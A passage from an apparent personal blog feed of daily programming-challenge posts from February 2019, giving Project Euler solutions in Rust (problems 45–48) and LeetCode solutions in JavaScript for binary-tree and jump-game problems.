      <content type="html"><![CDATA[<p>What I&#39;ve done today is <em>Self powers</em> in <em>Rust</em> and <em>Average of Levels in Binary Tree</em> in <em>JavaScript</em>.</p><a id="more"></a><h1 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h1><h2 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h2><h3 id="Self-powers"><a href="#Self-powers" class="headerlink" title="Self powers"></a>Self powers</h3><h3 id="Problem-48"><a href="#Problem-48" class="headerlink" title="Problem 48"></a>Problem 48</h3><p>The series, $1^1 + 2^2 + 3^3 + ... + 10^{10} = 10405071317$.</p><p>Find the last ten digits of the series, $1^1 + 2^2 + 3^3 + ... + 1000^{1000}$.</p><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>Modular arithmetic has compatibility with addition\multiplication.</p><p>Be careful, result of middle processing will exceed 2^64.</p><h2 id="Implementation"><a href="#Implementation" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> ans: <span class="built_in">u128</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">const</span> MOD: <span class="built_in">u128</span> = <span class="number">10_000_000_000</span>;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">1</span>..<span class="number">1001</span> &#123;</span><br><span class="line">        ans += quick_pow(i, i, MOD);</span><br><span class="line">        ans %= MOD;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"Answer is &#123;&#125;"</span>, ans);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">quick_pow</span></span>(<span class="keyword">mut</span> b: <span class="built_in">u128</span>, <span class="keyword">mut</span> e: <span class="built_in">u128</span>, m: <span class="built_in">u128</span>) -&gt; <span class="built_in">u128</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> ans = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> e != <span class="number">0</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> e&amp;<span class="number">1</span> == <span class="number">1</span> &#123;</span><br><span class="line">            ans *= b;</span><br><span class="line">            ans %= m;</span><br><span class="line">        &#125;</span><br><span class="line">        e &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">        b *= b;</span><br><span class="line">        b %= m;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Algorithm"><a href="#Algorithm" class="headerlink" title="Algorithm"></a>Algorithm</h1><h2 id="Problem-1"><a href="#Problem-1" class="headerlink" title="Problem"></a>Problem</h2><h3 id="637-Average-of-Levels-in-Binary-Tree"><a href="#637-Average-of-Levels-in-Binary-Tree" class="headerlink" title="637. Average of Levels in Binary Tree"></a>637. Average of Levels in Binary Tree</h3><p>Given a non-empty binary tree, return the average value of the nodes on each level in the form of an array.</p><p><strong>Example 1:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Input:</span><br><span class="line">    3</span><br><span class="line">   / \</span><br><span class="line">  9  20</span><br><span class="line">    /  \</span><br><span class="line">   15   7</span><br><span class="line">Output: [3, 14.5, 11]</span><br><span class="line">Explanation:</span><br><span class="line">The average value of nodes on level 0 is 3,  on level 1 is 14.5, and on level 2 is 11. Hence return [3, 14.5, 11].</span><br></pre></td></tr></table></figure><p><strong>Note:</strong></p><ol><li>The range of node&#39;s value is in the range of 32-bit signed integer.</li></ol><h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><p>Simple BFS/DFS.</p><p>I&#39;ve write a non-FP implementation and an implementation with a little FP :D</p><h2 id="Implementation-1"><a href="#Implementation-1" class="headerlink" title="Implementation"></a>Implementation</h2><p>non-FP</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * function TreeNode(val) &#123;</span></span><br><span class="line"><span class="comment"> *     this.val = val;</span></span><br><span class="line"><span class="comment"> *     this.left = this.right = null;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param &#123;TreeNode&#125; root</span></span><br><span class="line"><span class="comment"> * @return &#123;number[]&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> averageOfLevels = <span class="function"><span class="keyword">function</span>(<span class="params">root</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> queue = [];</span><br><span class="line">  <span class="keyword">let</span> ans = [];</span><br><span class="line">  <span class="keyword">let</span> cnt = [];</span><br><span class="line">  queue.push([<span class="number">0</span>, root]);</span><br><span class="line">  <span class="keyword">while</span> (queue.length) &#123;</span><br><span class="line">    <span class="keyword">let</span> cur = queue.shift();</span><br><span class="line">    <span class="keyword">if</span> (cur[<span class="number">1</span>] === <span class="literal">null</span>) <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">if</span> (ans.length &lt;= cur[<span class="number">0</span>]) ans.push(cur[<span class="number">1</span>].val);</span><br><span class="line">    <span class="keyword">else</span> ans[cur[<span class="number">0</span>]] += cur[<span class="number">1</span>].val;</span><br><span class="line">    <span class="keyword">if</span> (cnt.length &lt;= cur[<span class="number">0</span>]) cnt.push(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">else</span> cnt[cur[<span class="number">0</span>]] += <span class="number">1</span>;</span><br><span class="line">    queue.push([cur[<span class="number">0</span>]+<span class="number">1</span>, cur[<span class="number">1</span>].left]);</span><br><span class="line">    queue.push([cur[<span class="number">0</span>]+<span class="number">1</span>, cur[<span class="number">1</span>].right]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> [index, value] <span class="keyword">of</span> ans.entries()) &#123;</span><br><span class="line">    ans[index] = value/cnt[index];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ans;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>A little FP</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * function TreeNode(val) &#123;</span></span><br><span class="line"><span class="comment"> *     this.val = val;</span></span><br><span class="line"><span class="comment"> *     this.left = this.right = null;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param &#123;TreeNode&#125; root</span></span><br><span class="line"><span class="comment"> * @return &#123;number[]&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> averageOfLevels = <span class="function"><span class="keyword">function</span>(<span class="params">root</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> queue = [];</span><br><span class="line">  <span class="keyword">let</span> ans = [];</span><br><span class="line">  queue.push([<span class="number">0</span>, root]);</span><br><span class="line">  <span class="keyword">while</span> (queue.length) &#123;</span><br><span class="line">    <span class="keyword">let</span> cur = queue.shift();</span><br><span class="line">    <span class="keyword">if</span> (cur[<span class="number">1</span>] === <span class="literal">null</span>) <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">if</span> (ans.length &lt; cur[<span class="number">0</span>]) &#123;</span><br><span class="line">      ans.push(&#123;<span class="attr">cnt</span> : <span class="number">1</span>, <span class="attr">sum</span> : cur[<span class="number">1</span>].val&#125;);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      ans[cur[<span class="number">0</span>]].cnt += <span class="number">1</span>;</span><br><span class="line">      ans[cur[<span class="number">0</span>]].sum += cur[<span class="number">1</span>].val;</span><br><span class="line">    &#125;</span><br><span class="line">    queue.push([cur[<span class="number">0</span>]+<span class="number">1</span>, cur[<span class="number">1</span>].left]);</span><br><span class="line">    queue.push([cur[<span class="number">0</span>]+<span class="number">1</span>, cur[<span class="number">1</span>].right]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ans.map(<span class="function"><span class="params">val</span> =&gt;</span> val.sum/val.cnt);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> DailyChallenge </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Math </tag>
            
            <tag> Algorithm </tag>
            
            <tag> LeetCode </tag>
            
            <tag> ProjectEuler </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2019-02-05 Daily Challenge</title>
      <link href="/2019-02-05-Daily-Challenge/"/>
      <url>/2019-02-05-Daily-Challenge/</url>
      <content type="html"><![CDATA[<p>Happy new year!~</p><p>What I&#39;ve done today is <em>Distinct primes factors</em> in <em>Rust</em> and <em>Longest Univalue Path</em> in <em>JavaScript</em>.</p><a id="more"></a><h1 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h1><h2 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h2><h3 id="Distinct-primes-factors"><a href="#Distinct-primes-factors" class="headerlink" title="Distinct primes factors"></a>Distinct primes factors</h3><h3 id="Problem-47"><a href="#Problem-47" class="headerlink" title="Problem 47"></a>Problem 47</h3><p>The first two consecutive numbers to have two distinct prime factors are:</p><p>14 = 2 × 7<br>15 = 3 × 5</p><p>The first three consecutive numbers to have three distinct prime factors are:</p><p>644 = 2² × 7 × 23<br>645 = 3 × 5 × 43<br>646 = 2 × 17 × 19.</p><p>Find the first four consecutive integers to have four distinct prime factors each. What is the first of these numbers?</p><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>Nothing to say.</p><h2 id="Implementation"><a href="#Implementation" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="keyword">crate</span> primal;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> primal::Sieve;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> sieve: Sieve = Sieve::new(<span class="number">10000</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> found = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> cur: <span class="built_in">usize</span> = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> ans: <span class="built_in">usize</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> !found &#123;</span><br><span class="line">        <span class="keyword">while</span> sieve.factor(cur).unwrap().len() != <span class="number">4</span> &#123;</span><br><span class="line">            cur += <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut</span> tmp = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span> _i <span class="keyword">in</span> <span class="number">0</span>..<span class="number">3</span> &#123;</span><br><span class="line">            cur += <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> sieve.factor(cur).unwrap().len() != <span class="number">4</span> &#123;</span><br><span class="line">                tmp = <span class="literal">false</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> tmp == <span class="literal">true</span> &#123;</span><br><span class="line">            ans = cur - <span class="number">3</span>;</span><br><span class="line">            found = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        cur += <span class="number">1</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"Answer is &#123;&#125;"</span>, ans);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Algorithm"><a href="#Algorithm" class="headerlink" title="Algorithm"></a>Algorithm</h1><h2 id="Problem-1"><a href="#Problem-1" class="headerlink" title="Problem"></a>Problem</h2><h3 id="687-Longest-Univalue-Path"><a href="#687-Longest-Univalue-Path" class="headerlink" title="687. Longest Univalue Path"></a>687. Longest Univalue Path</h3><p>Given a binary tree, find the length of the longest path where each node in the path has the same value. This path may or may not pass through the root.</p><p><strong>Note:</strong> The length of path between two nodes is represented by the number of edges between them.</p><p><strong>Example 1:</strong></p><p>Input:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">    5</span><br><span class="line">   / \</span><br><span class="line">  4   5</span><br><span class="line"> / \   \</span><br><span class="line">1   1   5</span><br></pre></td></tr></table></figure><p>Output:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2</span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><p>Input:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">    1</span><br><span class="line">   / \</span><br><span class="line">  4   5</span><br><span class="line"> / \   \</span><br><span class="line">4   4   5</span><br></pre></td></tr></table></figure><p>Output:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2</span><br></pre></td></tr></table></figure><p><strong>Note:</strong> The given binary tree has not more than 10000 nodes. The height of the tree is not more than 1000.</p><h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><p>It&#39;s easy to come up with recursive this idea.</p><p>And with more deep thinking you might find that, if we want to construct a longer path with subnode&#39;s subtree, we can just pick one subtree, and we need to maintain answer at processing.</p><h2 id="Implementation-1"><a href="#Implementation-1" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * function TreeNode(val) &#123;</span></span><br><span class="line"><span class="comment"> *     this.val = val;</span></span><br><span class="line"><span class="comment"> *     this.left = this.right = null;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param &#123;TreeNode&#125; root</span></span><br><span class="line"><span class="comment"> * @return &#123;number&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> longestUnivaluePath = <span class="function"><span class="keyword">function</span>(<span class="params">root</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> ans = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">const</span> findPath = <span class="function">(<span class="params">root</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (root === <span class="literal">null</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">let</span> left = findPath(root.left);</span><br><span class="line">    <span class="keyword">let</span> right = findPath(root.right);</span><br><span class="line">    <span class="keyword">let</span> arrowLeft = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">let</span> arrowRight = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (root.left !== <span class="literal">null</span> &amp;&amp; root.left.val === root.val) &#123;</span><br><span class="line">      arrowLeft = left + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (root.right !== <span class="literal">null</span> &amp;&amp; root.right.val === root.val) &#123;</span><br><span class="line">      arrowRight = right + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ans = <span class="built_in">Math</span>.max(ans, arrowLeft + arrowRight);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Math</span>.max(arrowRight, arrowLeft);</span><br><span class="line">  &#125;;</span><br><span class="line">  findPath(root);</span><br><span class="line">  <span class="keyword">return</span> ans;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> DailyChallenge </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Math </tag>
            
            <tag> Algorithm </tag>
            
            <tag> LeetCode </tag>
            
            <tag> ProjectEuler </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2019-02-04 Daily Challenge</title>
      <link href="/2019-02-04-Daily-Challenge/"/>
      <url>/2019-02-04-Daily-Challenge/</url>
      <content type="html"><![CDATA[<p>What I&#39;ve done today is <em>Triangular, pentagonal, and hexagonal</em> in <em>Rust</em> and <em>LRU Cache</em> in <em>JavaScript</em>.</p><a id="more"></a><h1 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h1><h2 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h2><h3 id="Goldbach-39-s-other-conjecture"><a href="#Goldbach-39-s-other-conjecture" class="headerlink" title="Goldbach&#39;s other conjecture"></a>Goldbach&#39;s other conjecture</h3><h3 id="Problem-46"><a href="#Problem-46" class="headerlink" title="Problem 46"></a>Problem 46</h3><p>It was proposed by Christian Goldbach that every odd composite number can be written as the sum of a prime and twice a square.</p><p>9 = 7 + 2×1^2<br>15 = 7 + 2×2^2<br>21 = 3 + 2×3^2<br>25 = 7 + 2×3^2<br>27 = 19 + 2×2^2<br>33 = 31 + 2×1^2</p><p>It turns out that the conjecture was false.</p><p>What is the smallest odd composite that cannot be written as the sum of a prime and twice a square?</p><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>Nothing to say.</p><h2 id="Implementation"><a href="#Implementation" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="keyword">crate</span> primal;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> primal::Sieve;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="keyword">const</span> LIMIT: <span class="built_in">usize</span> = <span class="number">1_000_000</span>;</span><br><span class="line">    <span class="keyword">let</span> sieve: Sieve = Sieve::new(LIMIT);</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> found = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> cur: <span class="built_in">usize</span> = <span class="number">9</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> ans: <span class="built_in">usize</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> !found &#123;</span><br><span class="line">        <span class="keyword">while</span> sieve.is_prime(cur) &#123;</span><br><span class="line">            cur += <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">let</span> bound = sieve.prime_pi(cur-<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut</span> ok = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">1</span>..(bound+<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> is_twice_a_square(cur - sieve.nth_prime(i)) &#123;</span><br><span class="line">                ok = <span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> !ok &#123;</span><br><span class="line">            ans = cur;</span><br><span class="line">            found = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        cur += <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"Answer is &#123;&#125;"</span>, ans);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">is_twice_a_square</span></span>(n: <span class="built_in">usize</span>) -&gt; <span class="built_in">bool</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> tmp = (n/<span class="number">2</span>) <span class="keyword">as</span> <span class="built_in">f64</span>;</span><br><span class="line">    <span class="keyword">let</span> tmp = tmp.sqrt();</span><br><span class="line">    <span class="keyword">let</span> tmp = tmp <span class="keyword">as</span> <span class="built_in">usize</span>;</span><br><span class="line">    tmp*tmp == n/<span class="number">2</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Algorithm"><a href="#Algorithm" class="headerlink" title="Algorithm"></a>Algorithm</h1><h2 id="Problem-1"><a href="#Problem-1" class="headerlink" title="Problem"></a>Problem</h2><h3 id="55-Jump-Game"><a href="#55-Jump-Game" class="headerlink" title="55. Jump Game"></a>55. Jump Game</h3><p>Medium</p><p>Given an array of non-negative integers, you are initially positioned at the first index of the array.</p><p>Each element in the array represents your maximum jump length at that position.</p><p>Determine if you are able to reach the last index.</p><p><strong>Example 1:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: [2,3,1,1,4]</span><br><span class="line">Output: true</span><br><span class="line">Explanation: Jump 1 step from index 0 to 1, then 3 steps to the last index.</span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Input: [3,2,1,0,4]</span><br><span class="line">Output: false</span><br><span class="line">Explanation: You will always arrive at index 3 no matter what. Its maximum</span><br><span class="line">             jump length is 0, which makes it impossible to reach the last index.</span><br></pre></td></tr></table></figure><h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><p>Simple DP.</p><h2 id="Implementation-1"><a href="#Implementation-1" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param &#123;number[]&#125; nums</span></span><br><span class="line"><span class="comment"> * @return &#123;boolean&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> canJump = <span class="function"><span class="keyword">function</span>(<span class="params">nums</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> dp = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt;= <span class="built_in">Math</span>.min(nums.length<span class="number">-1</span>, dp); ++i) &#123;</span><br><span class="line">    dp = <span class="built_in">Math</span>.max(i+nums[i], dp);</span><br><span class="line">    <span class="keyword">if</span> (dp &gt;= nums.length<span class="number">-1</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> DailyChallenge </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Math </tag>
            
            <tag> Algorithm </tag>
            
            <tag> LeetCode </tag>
            
            <tag> ProjectEuler </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2019-02-03 Daily Challenge</title>
      <link href="/2019-02-03-Daily-Challenge/"/>
      <url>/2019-02-03-Daily-Challenge/</url>
      <content type="html"><![CDATA[<p>What I&#39;ve done today is <em>Triangular, pentagonal, and hexagonal</em> in <em>Rust</em> and <em>LRU Cache</em> in <em>JavaScript</em>.</p><a id="more"></a><h1 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h1><h2 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h2><h3 id="Triangular-pentagonal-and-hexagonal"><a href="#Triangular-pentagonal-and-hexagonal" class="headerlink" title="Triangular, pentagonal, and hexagonal"></a>Triangular, pentagonal, and hexagonal</h3><h3 id="Problem-45"><a href="#Problem-45" class="headerlink" title="Problem 45"></a>Problem 45</h3><p>Triangle, pentagonal, and hexagonal numbers are generated by the following formulae:<br>| Number   |      Formula        | ...  |<br>| ---------- | --------------------- | ---- | --------------------- |<br>| Triangle   |       T<em>n</em>=<em>n</em>(<em>n</em>+1)/2        | 1, 3, 6, 10, 15, ...  |<br>| Pentagonal |       P<em>n</em>=<em>n</em>(3<em>n</em>−1)/2       | 1, 5, 12, 22, 35, ... |<br>| Hexagonal  |       H<em>n</em>=<em>n</em>(2<em>n</em>−1)         | 1, 6, 15, 28, 45, ... |</p><p>It can be verified that $T_{285}$ = $P_{165}$ = $H_{143}$ = 40755.</p><p>Find the next triangle number that is also pentagonal and hexagonal.</p><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>Brute Force!!!!</p><h2 id="Implementation"><a href="#Implementation" class="headerlink" 